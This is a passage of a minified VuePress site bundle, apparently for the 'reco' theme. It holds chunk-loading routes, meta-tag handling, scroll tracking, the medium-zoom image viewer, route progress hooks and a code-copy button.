n.e(34).then(n.bind(null,607))},"v-aa3952aa":function(){return n.e(35).then(n.bind(null,608))},"v-049f88b7":function(){return n.e(36).then(n.bind(null,609))},"v-1f913eb1":function(){return n.e(37).then(n.bind(null,610))},"v-fa2c8ad6":function(){return n.e(38).then(n.bind(null,611))},"v-5e5caa16":function(){return n.e(39).then(n.bind(null,612))},"v-435d5b96":function(){return n.e(40).then(n.bind(null,613))},"v-da1448fe":function(){return n.e(41).then(n.bind(null,614))},"v-0e04e1ab":function(){return n.e(42).then(n.bind(null,615))},"v-5d7f0599":function(){return n.e(43).then(n.bind(null,616))},"v-07ea8c85":function(){return n.e(44).then(n.bind(null,617))},"v-43be314a":function(){return n.e(45).then(n.bind(null,618))},"v-f973569e":function(){return n.e(46).then(n.bind(null,619))},"v-61e759d5":function(){return n.e(47).then(n.bind(null,620))},"v-6b44efd6":function(){return n.e(48).then(n.bind(null,621))},"v-1b819156":function(){return n.e(49).then(n.bind(null,622))},"v-42382335":function(){return n.e(50).then(n.bind(null,623))},"v-2193b535":function(){return n.e(51).then(n.bind(null,624))},"v-18da1455":function(){return n.e(52).then(n.bind(null,625))},"v-0d4945d5":function(){return n.e(53).then(n.bind(null,626))},"v-7e22e792":function(){return n.e(54).then(n.bind(null,627))},"v-d63b1f8a":function(){return n.e(55).then(n.bind(null,628))},"v-776b2711":function(){return n.e(56).then(n.bind(null,629))},"v-1e525989":function(){return n.e(57).then(n.bind(null,630))},"v-4f2ac141":function(){return n.e(58).then(n.bind(null,631))},"v-5c6d1015":function(){return n.e(59).then(n.bind(null,632))},"v-104df23e":function(){return n.e(60).then(n.bind(null,633))},"v-292b35b3":function(){return n.e(61).then(n.bind(null,634))},"v-32f7ba59":function(){return n.e(62).then(n.bind(null,635))},"v-3828dd95":function(){return n.e(63).then(n.bind(null,636))},"v-5adb12da":function(){return n.e(64).then(n.bind(null,637))},"v-0282ef96":function(){return n.e(65).then(n.bind(null,638))},"v-6c2405b2":function(){return n.e(66).then(n.bind(null,639))},"v-6c49fb91":function(){return n.e(67).then(n.bind(null,640))},"v-18b2e7b5":function(){return n.e(68).then(n.bind(null,641))},"v-6c77f9f5":function(){return n.e(69).then(n.bind(null,642))},"v-f0b0fff6":function(){return n.e(70).then(n.bind(null,643))},"v-7f803556":function(){return n.e(71).then(n.bind(null,644))},"v-702c0696":function(){return n.e(72).then(n.bind(null,645))},"v-6cf5afb5":function(){return n.e(73).then(n.bind(null,646))},"v-491985b5":function(){return n.e(74).then(n.bind(null,647))},"v-1dade755":function(){return n.e(75).then(n.bind(null,648))},"v-04c6e555":function(){return n.e(76).then(n.bind(null,649))},"v-b919e6d6":function(){return n.e(77).then(n.bind(null,650))},"v-5beda655":function(){return n.e(78).then(n.bind(null,651))},"v-616f7659":function(){return n.e(79).then(n.bind(null,652))},"v-498fee96":function(){return n.e(80).then(n.bind(null,653))},"v-a4510a56":function(){return n.e(81).then(n.bind(null,654))},"v-cc7f1d86":function(){return n.e(83).then(n.bind(null,655))},"v-95f40d72":function(){return n.e(82).then(n.bind(null,656))},"v-7d6e7395":function(){return n.e(84).then(n.bind(null,657))},"v-7bc18c95":function(){return n.e(85).then(n.bind(null,658))},"v-4fd337d6":function(){return n.e(86).then(n.bind(null,659))},"v-380ef2c3":function(){return n.e(87).then(n.bind(null,660))},"v-72907a15":function(){return n.e(88).then(n.bind(null,661))},"v-6a16cd8a":function(){return n.e(89).then(n.bind(null,662))},"v-c1514bd6":function(){return n.e(90).then(n.bind(null,663))},"v-010f5256":function(){return n.e(91).then(n.bind(null,664))},"v-ac60ddd6":function(){return n.e(92).then(n.bind(null,665))},"v-d04da692":function(){return n.e(93).then(n.bind(null,666))},"v-5039faf5":function(){return n.e(94).then(n.bind(null,667))},"v-0712dd96":function(){return n.e(95).then(n.bind(null,668))},"v-767f87d6":function(){return n.e(96).then(n.bind(null,669))},"v-2f069e4b":function(){return n.e(97).then(n.bind(null,670))},"v-9b7065d6":function(){return n.e(98).then(n.bind(null,671))},"v-47687595":function(){return n.e(99).then(n.bind(null,672))},"v-24b2e796":function(){return n.e(100).then(n.bind(null,673))},"v-8ce62bd6":function(){return n.e(101).then(n.bind(null,674))},"v-1f196cb5":function(){return n.e(102).then(n.bind(null,675))},"v-29746f67":function(){return n.e(103).then(n.bind(null,676))},"v-2784e116":function(){return n.e(104).then(n.bind(null,677))},"v-227c8f35":function(){return n.e(105).then(n.bind(null,678))},"v-58810e03":function(){return n.e(106).then(n.bind(null,679))},"v-8295b0b2":function(){return n.e(107).then(n.bind(null,680))},"v-87e97576":function(){return n.e(108).then(n.bind(null,681))},"v-68069695":function(){return n.e(109).then(n.bind(null,682))},"v-6b038912":function(){return n.e(110).then(n.bind(null,683))},"v-76caf955":function(){return n.e(111).then(n.bind(null,684))},"v-69f32783":function(){return n.e(112).then(n.bind(null,685))},"v-04126f96":function(){return n.e(113).then(n.bind(null,686))},"v-1b44a315":function(){return n.e(114).then(n.bind(null,687))},"v-e6812956":function(){return n.e(115).then(n.bind(null,688))},"v-5a417755":function(){return n.e(116).then(n.bind(null,689))},"v-6ca5a34e":function(){return n.e(117).then(n.bind(null,690))},"v-7e5a509d":function(){return n.e(118).then(n.bind(null,691))},"v-096861c6":function(){return n.e(121).then(n.bind(null,692))},"v-7850d7a6":function(){return n.e(122).then(n.bind(null,693))},"v-2e589377":function(){return n.e(123).then(n.bind(null,694))},"v-9c14bbee":function(){return n.e(124).then(n.bind(null,695))},"v-5a9a97d3":function(){return n.e(125).then(n.bind(null,696))},"v-eea22916":function(){return n.e(126).then(n.bind(null,697))},"v-e2048eea":function(){return n.e(127).then(n.bind(null,698))},"v-d082df56":function(){return n.e(128).then(n.bind(null,699))},"v-c369f3d6":function(){return n.e(129).then(n.bind(null,700))},"v-c332e8b2":function(){return n.e(130).then(n.bind(null,701))},"v-73177416":function(){return n.e(132).then(n.bind(null,702))},"v-84b7ad6e":function(){return n.e(131).then(n.bind(null,703))},"v-5cce6a81":function(){return n.e(133).then(n.bind(null,704))},"v-0d97d71d":function(){return n.e(134).then(n.bind(null,705))},"v-6721f67e":function(){return n.e(135).then(n.bind(null,706))},"v-4df80256":function(){return n.e(136).then(n.bind(null,707))},"v-7c0abcf5":function(){return n.e(137).then(n.bind(null,708))},"v-3952afd6":function(){return n.e(138).then(n.bind(null,709))},"v-61a8b796":function(){return n.e(139).then(n.bind(null,710))},"v-1894bebd":function(){return n.e(140).then(n.bind(null,711))},"v-77e1dd96":function(){return n.e(141).then(n.bind(null,712))},"v-60a2e455":function(){return n.e(142).then(n.bind(null,713))},"v-26217af5":function(){return n.e(143).then(n.bind(null,714))},"v-2e5167ae":function(){return n.e(144).then(n.bind(null,715))},"v-87e1ce96":function(){return n.e(145).then(n.bind(null,716))},"v-70a090d6":function(){return n.e(147).then(n.bind(null,717))},"v-63fda015":function(){return n.e(146).then(n.bind(null,718))},"v-3ae6294e":function(){return n.e(148).then(n.bind(null,719))},"v-76f4dad5":function(){return n.e(149).then(n.bind(null,720))},"v-1fc23475":function(){return n.e(150).then(n.bind(null,721))},"v-0979bd15":function(){return n.e(151).then(n.bind(null,722))},"v-32cf99d6":function(){return n.e(152).then(n.bind(null,723))},"v-2bbf93d6":function(){return n.e(153).then(n.bind(null,724))},"v-01b4ab15":function(){return n.e(154).then(n.bind(null,725))},"v-9b30c856":function(){return n.e(155).then(n.bind(null,726))},"v-746cdd95":function(){return n.e(156).then(n.bind(null,727))},"v-f5496396":function(){return n.e(157).then(n.bind(null,728))},"v-54fcb436":function(){return n.e(158).then(n.bind(null,729))},"v-3f06da6a":function(){return n.e(159).then(n.bind(null,730))},"v-1bd08d35":function(){return n.e(160).then(n.bind(null,731))},"v-5c7797b3":function(){return n.e(162).then(n.bind(null,732))},"v-0d74b689":function(){return n.e(161).then(n.bind(null,733))},"v-90f76eae":function(){return n.e(163).then(n.bind(null,734))},"v-7e1ece56":function(){return n.e(164).then(n.bind(null,735))},"v-15b41f32":function(){return n.e(165).then(n.bind(null,736))},"v-61e83e96":function(){return n.e(166).then(n.bind(null,737))},"v-7e955396":function(){return n.e(167).then(n.bind(null,738))},"v-a67a6d56":function(){return n.e(168).then(n.bind(null,739))},"v-8b9b4e56":function(){return n.e(169).then(n.bind(null,740))},"v-6f1a2996":function(){return n.e(171).then(n.bind(null,741))},"v-16db1b71":function(){return n.e(170).then(n.bind(null,742))},"v-3d50358a":function(){return n.e(172).then(n.bind(null,743))},"v-15727ef5":function(){return n.e(173).then(n.bind(null,744))},"v-85468472":function(){return n.e(174).then(n.bind(null,745))},"v-00a26d55":function(){return n.e(175).then(n.bind(null,746))},"v-23250675":function(){return n.e(176).then(n.bind(null,747))},"v-613522d6":function(){return n.e(177).then(n.bind(null,748))},"v-1ea388d5":function(){return n.e(178).then(n.bind(null,749))},"v-719ba3b5":function(){return n.e(179).then(n.bind(null,750))},"v-e52ae3ea":function(){return n.e(180).then(n.bind(null,751))},"v-c9b5a896":function(){return n.e(181).then(n.bind(null,752))},"v-709b8e62":function(){return n.e(182).then(n.bind(null,753))},"v-fb8dfee6":function(){return n.e(183).then(n.bind(null,754))},"v-148b7eb2":function(){return n.e(184).then(n.bind(null,755))},"v-7d4dc5b5":function(){return n.e(185).then(n.bind(null,756))},"v-cd0009da":function(){return n.e(187).then(n.bind(null,757))},"v-ba53614e":function(){return n.e(186).then(n.bind(null,758))},"v-6ba133d7":function(){return n.e(188).then(n.bind(null,759))},"v-22946ad5":function(){return n.e(189).then(n.bind(null,760))},"v-7ccf6496":function(){return n.e(191).then(n.bind(null,761))},"v-bd4d6aca":function(){return n.e(190).then(n.bind(null,762))},"v-eef0feba":function(){return n.e(192).then(n.bind(null,763))},"v-66db61c2":function(){return n.e(193).then(n.bind(null,764))},"v-bb99a562":function(){return n.e(194).then(n.bind(null,765))},"v-3caae1b5":function(){return n.e(195).then(n.bind(null,766))},"v-7a72b4d5":function(){return n.e(196).then(n.bind(null,767))},"v-0e672596":function(){return n.e(197).then(n.bind(null,768))},"v-2f696eaf":function(){return n.e(198).then(n.bind(null,769))},"v-17fc0e0f":function(){return n.e(199).then(n.bind(null,770))},"v-3b273055":function(){return n.e(200).then(n.bind(null,771))},"v-1be519e2":function(){return n.e(201).then(n.bind(null,772))},"v-6d232af5":function(){return n.e(202).then(n.bind(null,773))},"v-29c37f5d":function(){return n.e(203).then(n.bind(null,774))},"v-08e69af5":function(){return n.e(204).then(n.bind(null,775))},"v-5c54710e":function(){return n.e(205).then(n.bind(null,776))},"v-7d1774f5":function(){return n.e(206).then(n.bind(null,777))},"v-6189ebda":function(){return n.e(207).then(n.bind(null,778))},"v-7082447d":function(){return n.e(208).then(n.bind(null,779))},"v-d48c57ee":function(){return n.e(209).then(n.bind(null,780))},"v-cb3a0bae":function(){return n.e(120).then(n.bind(null,781))},"v-58a72a75":function(){return n.e(119).then(n.bind(null,782))}};function et(e){var t=Object.create(null);return function(n){return t[n]||(t[n]=e(n))}}var tt=/-(\w)/g,nt=et((function(e){return e.replace(tt,(function(e,t){return t?t.toUpperCase():""}))})),rt=/\B([A-Z])/g,at=et((function(e){return e.replace(rt,"-$1").toLowerCase()})),ot=et((function(e){return e.charAt(0).toUpperCase()+e.slice(1)}));function it(e,t){if(t)return e(t)?e(t):t.includes("-")?e(ot(nt(t))):e(ot(t))||e(at(t))}var st=Object.assign({},Ye,Xe),lt=function(e){return st[e]},ct=function(e){return Xe[e]},ut=function(e){return Ye[e]},pt=function(e){return o.default.component(e)};function dt(e){return it(ct,e)}function gt(e){return it(ut,e)}function ht(e){return it(lt,e)}function ft(e){return it(pt,e)}function mt(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];return Promise.all(t.filter((function(e){return e})).map(function(){var e=a(regeneratorRuntime.mark((function e(t){var n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(ft(t)||!ht(t)){e.next=5;break}return e.next=3,ht(t)();case 3:n=e.sent,o.default.component(t,n.default);case 5:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}()))}function vt(e,t){"undefined"!=typeof window&&window.__VUEPRESS__&&(window.__VUEPRESS__[e]=t)}n(100),n(216),n(83);n(74),n(92),n(138);var bt=n(98);function yt(e,t){return function(e){if(Array.isArray(e))return e}(e)||function(e,t){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(e)){var n=[],r=!0,a=!1,o=void 0;try{for(var i,s=e[Symbol.iterator]();!(r=(i=s.next()).done)&&(n.push(i.value),!t||n.length!==t);r=!0);}catch(e){a=!0,o=e}finally{try{r||null==s.return||s.return()}finally{if(a)throw o}}return n}}(e,t)||Object(bt.a)(e,t)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}var xt=n(263),kt=n.n(xt),wt={created:function(){if(this.siteMeta=this.$site.headTags.filter((function(e){return"meta"===yt(e,1)[0]})).map((function(e){var t=yt(e,2);t[0];return t[1]})),this.$ssrContext){var e=this.getMergedMetaTags();this.$ssrContext.title=this.$title,this.$ssrContext.lang=this.$lang,this.$ssrContext.pageMeta=(t=e)?t.map((function(e){var t="<meta";return Object.keys(e).forEach((function(n){t+=" ".concat(n,'="').concat(e[n],'"')})),t+">"})).join("\n    "):"",this.$ssrContext.canonicalLink=_t(this.$canonicalUrl)}var t},mounted:function(){this.currentMetaTags=Object(Ze.a)(document.querySelectorAll("meta")),this.updateMeta(),this.updateCanonicalLink()},methods:{updateMeta:function(){document.title=this.$title,document.documentElement.lang=this.$lang;var e=this.getMergedMetaTags();this.currentMetaTags=Tt(e,this.currentMetaTags)},getMergedMetaTags:function(){var e=this.$page.frontmatter.meta||[];return kt()([{name:"description",content:this.$description}],e,this.siteMeta,jt)},updateCanonicalLink:function(){St(),this.$canonicalUrl&&document.head.insertAdjacentHTML("beforeend",_t(this.$canonicalUrl))}},watch:{$page:function(){this.updateMeta(),this.updateCanonicalLink()}},beforeDestroy:function(){Tt(null,this.currentMetaTags),St()}};function St(){var e=document.querySelector("link[rel='canonical']");e&&e.remove()}function _t(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return e?'<link href="'.concat(e,'" rel="canonical" />'):""}function Tt(e,t){if(t&&Object(Ze.a)(t).filter((function(e){return e.parentNode===document.head})).forEach((function(e){return document.head.removeChild(e)})),e)return e.map((function(e){var t=document.createElement("meta");return Object.keys(e).forEach((function(n){t.setAttribute(n,e[n])})),document.head.appendChild(t),t}))}function jt(e){for(var t=0,n=["name","property","itemprop"];t<n.length;t++){var r=n[t];if(e.hasOwnProperty(r))return e[r]+r}return JSON.stringify(e)}n(151);var Pt=n(264),Ct={mounted:function(){window.addEventListener("scroll",this.onScroll)},methods:{onScroll:n.n(Pt)()((function(){this.setActiveHash()}),300),setActiveHash:function(){for(var e=this,t=[].slice.call(document.querySelectorAll(".sidebar-link")),n=[].slice.call(document.querySelectorAll(".header-anchor")).filter((function(e){return t.some((function(t){return t.hash===e.hash}))})),r=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight),o=window.innerHeight+r,i=0;i<n.length;i++){var s=n[i],l=n[i+1],c=0===i&&0===r||r>=s.parentElement.offsetTop+10&&(!l||r<l.parentElement.offsetTop-10),u=decodeURIComponent(this.$route.hash);if(c&&u!==decodeURIComponent(s.hash)){var p=s;if(o===a)for(var d=i+1;d<n.length;d++)if(u===decodeURIComponent(n[d].hash))return;return this.$vuepress.$set("disableScrollBehavior",!0),void this.$router.replace(decodeURIComponent(p.hash),(function(){e.$nextTick((function(){e.$vuepress.$set("disableScrollBehavior",!1)}))}))}}}},beforeDestroy:function(){window.removeEventListener("scroll",this.onScroll)}},Et=(n(44),n(429),Object.assign||function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}),At=function(e){return"IMG"===e.tagName},Ot=function(e){return e&&1===e.nodeType},It=function(e){return".svg"===(e.currentSrc||e.src).substr(-4).toLowerCase()},Lt=function(e){try{return Array.isArray(e)?e.filter(At):function(e){return NodeList.prototype.isPrototypeOf(e)}(e)?[].slice.call(e).filter(At):Ot(e)?[e].filter(At):"string"==typeof e?[].slice.call(document.querySelectorAll(e)).filter(At):[]}catch(e){throw new TypeError("The provided selector is invalid.\nExpects a CSS selector, a Node element, a NodeList or an array.\nSee: https://github.com/francoischalifour/medium-zoom")}},Mt=function(e){var t=document.createElement("div");return t.classList.add("medium-zoom-overlay"),t.style.background=e,t},Rt=function(e){var t=e.getBoundingClientRect(),n=t.top,r=t.left,a=t.width,o=t.height,i=e.cloneNode(),s=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,l=window.pageXOffset||document.documentElement.scrollLeft||document.body.scrollLeft||0;return i.removeAttribute("id"),i.style.position="absolute",i.style.top=n+s+"px",i.style.left=r+l+"px",i.style.width=a+"px",i.style.height=o+"px",i.style.transform="",i},Dt=function(e,t){var n=Et({bubbles:!1,cancelable:!1,detail:void 0},t);if("function"==typeof window.CustomEvent)return new CustomEvent(e,n);var r=document.createEvent("CustomEvent");return r.initCustomEvent(e,n.bubbles,n.cancelable,n.detail),r};!function(e,t){void 0===t&&(t={});var n=t.insertAt;if(e&&"undefined"!=typeof document){var r=document.head||document.getElementsByTagName("head")[0],a=document.createElement("style");a.type="text/css","top"===n&&r.firstChild?r.insertBefore(a,r.firstChild):r.appendChild(a),a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e))}}(".medium-zoom-overlay{position:fixed;top:0;right:0;bottom:0;left:0;opacity:0;transition:opacity .3s;will-change:opacity}.medium-zoom--opened .medium-zoom-overlay{cursor:pointer;cursor:zoom-out;opacity:1}.medium-zoom-image{cursor:pointer;cursor:zoom-in;transition:transform .3s cubic-bezier(.2,0,.2,1)!important}.medium-zoom-image--hidden{visibility:hidden}.medium-zoom-image--opened{position:relative;cursor:pointer;cursor:zoom-out;will-change:transform}");var Nt=function e(t){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},r=window.Promise||function(e){function t(){}e(t,t)},a=function(e){var t=e.target;t!==T?-1!==y.indexOf(t)&&f({target:t}):h()},o=function(){if(!k&&_.original){var e=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0;Math.abs(w-e)>S.scrollOffset&&setTimeout(h,150)}},i=function(e){var t=e.key||e.keyCode;"Escape"!==t&&"Esc"!==t&&27!==t||h()},s=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=e;if(e.background&&(T.style.background=e.background),e.container&&e.container instanceof Object&&(t.container=Et({},S.container,e.container)),e.template){var n=Ot(e.template)?e.template:document.querySelector(e.template);t.template=n}return S=Et({},S,t),y.forEach((function(e){e.dispatchEvent(Dt("medium-zoom:update",{detail:{zoom:j}}))})),j},l=function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return e(Et({},S,t))},c=function(){for(var e=arguments.length,t=Array(e),n=0;n<e;n++)t[n]=arguments[n];var r=t.reduce((function(e,t){return[].concat(e,Lt(t))}),[]);return r.filter((function(e){return-1===y.indexOf(e)})).forEach((function(e){y.push(e),e.classList.add("medium-zoom-image")})),x.forEach((function(e){var t=e.type,n=e.listener,a=e.options;r.forEach((function(e){e.addEventListener(t,n,a)}))})),j},u=function(){for(var e=arguments.length,t=Array(e),n=0;n<e;n++)t[n]=arguments[n];_.zoomed&&h();var r=t.length>0?t.reduce((function(e,t){return[].concat(e,Lt(t))}),[]):y;return r.forEach((function(e){e.classList.remove("medium-zoom-image"),e.dispatchEvent(Dt("medium-zoom:detach",{detail:{zoom:j}}))})),y=y.filter((function(e){return-1===r.indexOf(e)})),j},p=function(e,t){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(r){r.addEventListener("medium-zoom:"+e,t,n)})),x.push({type:"medium-zoom:"+e,listener:t,options:n}),j},d=function(e,t){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return y.forEach((function(r){r.removeEventListener("medium-zoom:"+e,t,n)})),x=x.filter((function(n){return!(n.type==="medium-zoom:"+e&&n.listener.toString()===t.toString())})),j},g=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=e.target,n=function(){var e={width:document.documentElement.clientWidth,height:document.documentElement.clientHeight,left:0,top:0,right:0,bottom:0},t=void 0,n=void 0;if(S.container)if(S.container instanceof Object)t=(e=Et({},e,S.container)).width-e.left-e.right-2*S.margin,n=e.height-e.top-e.bottom-2*S.margin;else{var r=(Ot(S.container)?S.container:document.querySelector(S.container)).getBoundingClientRect(),a=r.width,o=r.height,i=r.left,s=r.top;e=Et({},e,{width:a,height:o,left:i,top:s})}t=t||e.width-2*S.margin,n=n||e.height-2*S.margin;var l=_.zoomedHd||_.original,c=It(l)?t:l.naturalWidth||t,u=It(l)?n:l.naturalHeight||n,p=l.getBoundingClientRect(),d=p.top,g=p.left,h=p.width,f=p.height,m=Math.min(c,t)/h,v=Math.min(u,n)/f,b=Math.min(m,v),y="scale("+b+") translate3d("+((t-h)/2-g+S.margin+e.left)/b+"px, "+((n-f)/2-d+S.margin+e.top)/b+"px, 0)";_.zoomed.style.transform=y,_.zoomedHd&&(_.zoomedHd.style.transform=y)};return new r((function(e){if(t&&-1===y.indexOf(t))e(j);else{if(_.zoomed)e(j);else{if(t)_.original=t;else{if(!(y.length>0))return void e(j);var r=y;_.original=r[0]}if(_.original.dispatchEvent(Dt("medium-zoom:open",{detail:{zoom:j}})),w=window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0,k=!0,_.zoomed=Rt(_.original),document.body.appendChild(T),S.template){var a=Ot(S.template)?S.template:document.querySelector(S.template);_.template=document.createElement("div"),_.template.appendChild(a.content.cloneNode(!0)),document.body.appendChild(_.template)}if(document.body.appendChild(_.zoomed),window.requestAnimationFrame((function(){document.body.classList.add("medium-zoom--opened")})),_.original.classList.add("medium-zoom-image--hidden"),_.zoomed.classList.add("medium-zoom-image--opened"),_.zoomed.addEventListener("click",h),_.zoomed.addEventListener("transitionend",(function t(){k=!1,_.zoomed.removeEventListener("transitionend",t),_.original.dispatchEvent(Dt("medium-zoom:opened",{detail:{zoom:j}})),e(j)})),_.original.getAttribute("data-zoom-src")){_.zoomedHd=_.zoomed.cloneNode(),_.zoomedHd.removeAttribute("srcset"),_.zoomedHd.removeAttribute("sizes"),_.zoomedHd.src=_.zoomed.getAttribute("data-zoom-src"),_.zoomedHd.onerror=function(){clearInterval(o),console.warn("Unable to reach the zoom image target "+_.zoomedHd.src),_.zoomedHd=null,n()};var o=setInterval((function(){_.zoomedHd.complete&&(clearInterval(o),_.zoomedHd.classList.add("medium-zoom-image--opened"),_.zoomedHd.addEventListener("click",h),document.body.appendChild(_.zoomedHd),n())}),10)}else if(_.original.hasAttribute("srcset")){_.zoomedHd=_.zoomed.cloneNode(),_.zoomedHd.removeAttribute("sizes"),_.zoomedHd.removeAttribute("loading");var i=_.zoomedHd.addEventListener("load",(function(){_.zoomedHd.removeEventListener("load",i),_.zoomedHd.classList.add("medium-zoom-image--opened"),_.zoomedHd.addEventListener("click",h),document.body.appendChild(_.zoomedHd),n()}))}else n()}}}))},h=function(){return new r((function(e){if(!k&&_.original){k=!0,document.body.classList.remove("medium-zoom--opened"),_.zoomed.style.transform="",_.zoomedHd&&(_.zoomedHd.style.transform=""),_.template&&(_.template.style.transition="opacity 150ms",_.template.style.opacity=0),_.original.dispatchEvent(Dt("medium-zoom:close",{detail:{zoom:j}})),_.zoomed.addEventListener("transitionend",(function t(){_.original.classList.remove("medium-zoom-image--hidden"),document.body.removeChild(_.zoomed),_.zoomedHd&&document.body.removeChild(_.zoomedHd),document.body.removeChild(T),_.zoomed.classList.remove("medium-zoom-image--opened"),_.template&&document.body.removeChild(_.template),k=!1,_.zoomed.removeEventListener("transitionend",t),_.original.dispatchEvent(Dt("medium-zoom:closed",{detail:{zoom:j}})),_.original=null,_.zoomed=null,_.zoomedHd=null,_.template=null,e(j)}))}else e(j)}))},f=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=e.target;return _.original?h():g({target:t})},m=function(){return S},v=function(){return y},b=function(){return _.original},y=[],x=[],k=!1,w=0,S=n,_={original:null,zoomed:null,zoomedHd:null,template:null};"[object Object]"===Object.prototype.toString.call(t)?S=t:(t||"string"==typeof t)&&c(t),S=Et({margin:0,background:"#fff",scrollOffset:40,container:null,template:null},S);var T=Mt(S.background);document.addEventListener("click",a),document.addEventListener("keyup",i),document.addEventListener("scroll",o),window.addEventListener("resize",h);var j={open:g,close:h,toggle:f,update:s,clone:l,attach:c,detach:u,on:p,off:d,getOptions:m,getImages:v,getZoomedImage:b};return j},$t={data:function(){return{zoom:null}},mounted:function(){this.updateZoom()},updated:function(){this.updateZoom()},methods:{updateZoom:function(){var e=this;setTimeout((function(){e.zoom&&e.zoom.detach(),e.zoom=Nt(".theme-reco-content :not(a) > img",void 0)}),1e3)}}},Ft=(n(103),n(99)),Ut=n.n(Ft),Bt={mounted:function(){var e=this;Ut.a.configure({showSpinner:!1}),this.$router.beforeEach((function(e,t,n){e.path===t.path||o.default.component(e.name)||Ut.a.start(),n()})),this.$router.afterEach((function(){Ut.a.done(),e.isSidebarOpen=!1}))}},Ht=n(265),qt=n.n(Ht),zt={mounted:function(){qt.a.polyfill()}},Jt=n(7),Vt=(n(150),{props:{parent:Object,code:String,options:{align:String,color:String,backgroundTransition:Boolean,backgroundColor:String,successText:String,staticIcon:Boolean}},data:function(){return{success:!1,originalBackground:null,originalTransition:null}},computed:{alignStyle:function(){var e={};return e[this.options.align]="7.5px",e},iconClass:function(){return this.options.staticIcon?"":"hover"}},mounted:function(){this.originalTransition=this.parent.style.transition,this.originalBackground=this.parent.style.background},beforeDestroy:function(){this.parent.style.transition=this.originalTransition,this.parent.style.background=this.originalBackground},methods:{hexToRgb:function(e){var t=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(e);return t?{r:parseInt(t[1],16),g:parseInt(t[2],16),b:parseInt(t[3],16)}:null},copyToClipboard:function(e){var t=this;if(navigator.clipboard)navigator.clipboard.writeText(this.code).then((function(){t.setSuccessTransitions()}),(function(){}));else{var n=document.createElement("textarea");document.body.appendChild(n),n.value=this.code,n.select(),document.execCommand("Copy"),n.remove(),this.setSuccessTransitions()}},setSuccessTransitions:function(){var e=this;if(clearTimeout(this.successTimeout),this.options.backgroundTransition){this.parent.style.transition="background 350ms";var t=this.hexToRgb(this.options.backgroundColor);this.parent.style.background="rgba(".concat(t.r,", ").concat(t.g,", ").concat(t.b,", 0.1)")}this.success=!0,this.successTimeout=setTimeout((function(){e.options.backgroundTransition&&(e.parent.style.background=e.originalBackground,e.parent.style.transition=e.originalTransition),e.success=!1}),500)}}}),Wt=(n(432),n(5)),Kt=Object(Wt.a)(Vt,(function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"code-copy"},[n("svg",{class:e.iconClass,style:e.alignStyle,attrs:{xmlns:"http://www.w3.org/2000/svg",width:"24",height:"24",viewBox:"0 0 24 24"},on:{click:e.copyToClipboard}},[n("path",{attrs:{fill:"none",d:"M0 0h24v24H0z"}}),e._v(" "),n("path",{attrs:{fill:e.options.color,d:"M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm-1 4l6 6v10c0 1.1-.9 2-2 2H7.99C6.89 23 6 22.1 6 21l.01-14c0-1.1.89-2 1.99-2h7zm-1 7h5.5L14 6.5V12z"}})]),e._v(" "),n("span",{class:e.success?"success":"",style:e.alignStyle},[e._v("\n        "+e._s(e.options.successText)+"\n    ")])])}),[],!1,null,"49140617",null).exports,Gt=(n(433),[wt,Ct,$t,Bt,zt,{updated:function(){this.update()},methods:{update:function(){setTimeout((function(){document.querySelectorAll(void 0).forEach((function(e){if(!e.classList.contains("code-copy-added")){var t=new(o.default.extend(Kt)),n={align:void 0,color:void 0,backgroundTransition:!0,backgroundColor:void 0,successText:void 0,staticIcon:!1};t.options=Object(Jt.a)({},n),t.code=e.innerText,t.parent=e,t.$mount(),e.classList.add("code-copy-added"),e.appendChild(t.$el)}}))}),100)}}}]),Qt={name:"GlobalLayout",computed:{layout:function(){var e=this.getLayout();return vt("layout",e),o.default.component(e)}},methods:{getLayout:function(){if(this.$page.path){var e=this.$page.frontmatter.layout;return e&&(this.$vuepress.getLayoutAsyncComponent(e)||this.$vuepress.getVueComponent(e))?e:"Layout"}return"NotFound"}}},Zt=Object(Wt.a)(Qt,(function(){var e=this.$createElement;return(this._self._c||e)(this.layout,{tag:"component"})}),[],!1,null,null,null).exports;!function(e,t,n){var r;switch(t){case"components":e[t]||(e[t]={}),Object.assign(e[t],n);break;case"mixins":e[t]||(e[t]=[]),(r=e[t]).push.apply(r,Object(Ze.a)(n));break;default:throw new Error("Unknown option name.")}}(Zt,"mixins",Gt);var 